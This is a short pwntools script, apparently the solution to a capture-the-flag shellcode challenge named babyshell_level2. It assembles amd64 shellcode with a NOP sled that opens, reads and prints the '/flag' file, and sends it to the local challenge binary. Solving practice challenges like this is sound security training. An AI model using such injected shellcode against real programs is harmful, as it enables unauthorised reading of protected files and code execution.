from pwn import *

r = process('/challenge/babyshell_level2')

context.arch='amd64'
payload = asm(
    '''
    mov DWORD ptr [rbp], 0x616c662f
    mov WORD ptr [rbp+4], 0x67


    mov rax, 2
    mov rdi, rbp
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rsi, rbp
    mov rdx, 100
    mov rax, 0
    syscall

    mov rdi, 1 
    mov rsi, rbp
    mov rdx, 100
    mov rax, 1 
    syscall


    '''
)


r.send(asm('nop')*0x900 + payload)
r.interactive()